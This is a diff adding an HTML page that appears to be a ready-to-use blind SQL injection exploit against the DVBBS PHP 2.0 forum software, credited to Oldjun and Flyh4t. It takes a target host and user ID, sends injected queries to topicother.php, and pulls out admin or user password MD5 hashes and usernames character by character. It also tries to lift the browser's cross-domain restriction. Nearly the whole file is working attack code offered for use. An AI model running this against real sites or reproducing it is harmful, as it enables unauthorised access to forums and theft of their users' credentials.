@@ -1,0 +1,162 @@
+<html>
+<head>
+<title>Dvbbs·php Version 2.0++ Blind SQL Injection Exploit</title>
+<script language="Javascript" type="text/javascript">
+/*
+	----------------------------------------------------------------------------------------------
+	- DVBBS PHP 2.0 Forum Blind SQL Injection Exploit  -
+	- Info ---------------------------------------------------------------------------------------
+	- Author: oldjun -----------------------------------------------------------------------------
+	- Exploit Coded By Oldjun&Flyh4t -------------------------------------------------------------
+	- Site: http://www.Oldjun.com ----------------------------------------------------------------
+	----------------------------------------------------------------------------------------------
+*/
+function myrefresh()
+{
+       window.location.reload();
+}
+function makewhat(x){
+    var whereto=new Array(2)//新建一个数组，项数为第一个下拉列表的项数
+    for(i=0;i<2;i++)//循环第一个下拉列表的项数那么多次
+        whereto[i]=new Array();//子循环
+        //下面是给每个循环赋值
+            whereto[0][0]=new Option("后台密码","0");
+            whereto[0][1]=new Option("后台用户名","1");
+            whereto[0][2]=new Option("关联前台用户名","2");
+            whereto[1][0]=new Option("前台密码","3");
+            whereto[1][1]=new Option("前台用户名","4");
+    var what=document.form.what;//方便引用
+    for(m=what.options.length-1;m>0;m--)
+    //这个要看清楚,因为要重新填充下拉列表的话必须先清除里面原有的项,清除和增加当然是有区别的了,所以用递减
+        what.options[m]=null;//将该项设置为空,也就等于清除了
+    for(j=0;j<whereto[x].length;j++){//这个循环是填充下拉列表
+        what.options[j]=new Option(whereto[x][j].text,whereto[x][j].value)
+        //注意上面这据,列表的当前项等于 新项(数组对象的x,j项的文本为文本，)
+    }
+    what.options[0].selected=true;//设置被选中的初始值
+}
+function submitForm(){
+if (pass!=""){
+alert("please refresh this page and try again!");
+setTimeout('myrefresh()',1000); 
+return false;
+}
+var host= document.getElementById("host").value;
+var userid = document.getElementById("userid").value;
+//后台
+if(document.form.where.value==0){
+var params ="?t=9&action=join&activeid=1/**/and/**/1=(select/**/count(*)/**/from/**/dv_admin/**/where/**/id="+userid;
+}else{
+//前台
+var params ="?t=9&action=join&activeid=1/**/and/**/1=(select/**/count(*)/**/from/**/dv_user/**/where/**/userid="+userid;}
+var url = host+"/topicother.php"+params;
+document.getElementById("md5hash").innerHTML = "Exploiting, Please Wait..";
+var p="temp";
+var w=document.form.what.value;
+alert('Now begin to exploit!');
+sendCall('1','48',url,w,p);
+}
+</script>
+</head>
+<body>
+<font color=#CC0000>-Dvbbs·php Version 2.0++  Blind SQL Injection Exploit -</font>
+<p><p>
+<form name="form" action="" method="post">
+<TABLE>
+<TR>
+<TD>host</TD>
+<TD><INPUT TYPE="text" NAME="host" id="host" value="http://www.oldjun.com/bbs" size="30px">(URL to Dvbbs Php Forum Site: http://www.site.com/bbs)</TD>
+</TR>
+<TR>
+<TD>userid</TD>
+<TD><INPUT TYPE="text" NAME="userid" id="userid" value=1 size="30px">(UserID of the user you want to get the information)</TD>
+</TR>
+<TR>
+<TD>where</TD>
+<TD>
+<select name="where" size="1" onchange="makewhat(options.selectedIndex)">
+<option value="0" selected>后台</option>
+<option value="1">前台</option>
+</select>(front or back)
+</TD>
+</TR>
+<TR>
+<TD>what</TD>
+<TD>
+<select name="what">
+<option value="0">后台密码</option>
+<option value="1">后台用户名</option>
+<option value="2">关联前台用户名</option>
+</select>(what do you need,don't support Chinese username)
+</TD>
+</TR>
+<TR>
+<TD>
+</TD>
+<TD>
+<INPUT TYPE="button" name="submit" value="Exploit" onclick="submitForm();"></TD>
+</TR>
+</TABLE>
+</form>
+<div><font color=red><B>Output (whole username or MD5 Hash of password):</B></font><span id="md5hash"></span></div>
+<hr>
+Browser support: [IE7.0|IE6.0] [FF2.0]
+<p>
+Coded by Oldjun&Flyh4t
+<script language="javascript">
+var xmlHttp;
+var pass;
+pass="";
+function sendCall(i,j,url,w,p) {
+if (p=="temp"){p=url}
+//以下用户名暂不支持中文...
+//后台密码、用户名、关联的前台用户名
+switch(parseInt(w)){
+case 0:url = p+"/**/and/**/ascii(mid(password,"+i+",1))="+j+")/**/";break;
+case 1:url = p+"/**/and/**/ascii(mid(username,"+i+",1))="+j+")/**/";break;
+case 2:url = p+"/**/and/**/ascii(mid(adduser,"+i+",1))="+j+")/**/";break;
+//前台密码、用户名
+case 3:url = p+"/**/and/**/ascii(mid(userpassword,"+i+",1))="+j+")/**/";break;
+case 4:url = p+"/**/and/**/ascii(mid(username,"+i+",1))="+j+")/**/";break;
+}
+if (window.ActiveXObject) {
+xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+} else if (window.XMLHttpRequest) {
+xmlHttp = new XMLHttpRequest();
+//解决FF中跨域问题
+try{ 
+        netscape.security.PrivilegeManager.enablePrivilege( "UniversalBrowserRead "); 
+      }   catch   (e)   { 
+        alert( "Permission   UniversalBrowserRead   denied. "); 
+      } 
+}
+xmlHttp.onreadystatechange = function() {
+			if(xmlHttp.readyState == 4 && xmlHttp.status ==200) {
+				var str = xmlHttp.responseText;
+				//alert(str);
+				var md5hash=document.getElementById("md5hash");
+				//if(str.match(/\u8bf7\u767b\u9646\u540e\u64cd\u4f5c/)) {
+				if(!str.match(/\u672c\u6d3b\u52a8\u62a5\u540d\u4eba\u6570\u5df2\u6ee1/)) {
+					pass += String.fromCharCode(j);
+					md5hash.innerHTML = pass;
+					j = 48;
+					i++;
+				}
+				//如果检测用户名，直接使用else {j++; }
+				else {
+					if(j == 59&&(parseInt(w)==0||parseInt(w)==3)) { j = 96; }
+					else { j++; }
+				}
+				
+				if(pass.length >= 16) { alert("Exploitation Successfull!. Admin MD5 Hash(or username): "+pass); return true; }
+				sendCall(i,j,url,w,p);
+			}
+		}
+xmlHttp.open('GET', url, true);
+//xmlHttp.setrequestheader('Content-Type','text/html; encoding=gb2312');
+//xmlHttp.setRequestHeader("Connection", "close");
+xmlHttp.send(null);
+}
+</script>
+</body>
+</html>
